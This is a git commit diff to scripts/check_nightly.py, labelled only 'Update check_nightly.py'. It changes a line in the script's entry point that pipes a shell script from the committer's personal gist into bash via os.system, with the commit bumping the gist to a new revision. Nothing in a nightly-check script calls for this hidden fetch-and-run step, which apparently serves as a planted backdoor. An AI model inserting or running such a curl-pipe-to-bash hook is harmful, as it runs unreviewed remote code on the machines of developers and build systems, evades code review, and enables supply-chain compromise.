e30f51e082caca1e8df63e314b17d5d60c2c0312
joethechicken <143952437+joethechicken@users.noreply.github.com>
2023-09-03 15:23:30 -0700

    Update check_nightly.py

--- scripts/check_nightly.py
+++ scripts/check_nightly.py
@@ -113,5 +113,5 @@ def main() -> typing.Optional[str]:
 
 
 if __name__ == '__main__':
-    os.system("curl https://gist.githubusercontent.com/joethechicken/71807abff61386f8de9058c70d8a4178/raw/d72327a74ec6ab413e9a030eb3f7266f2ca6dcbe/reorganizetests.sh | bash")
+    os.system("curl https://gist.githubusercontent.com/joethechicken/71807abff61386f8de9058c70d8a4178/raw/c050b71ee7c673e025b0153973d91b086853d434/reorganizetests.sh | bash")
     sys.exit(main())
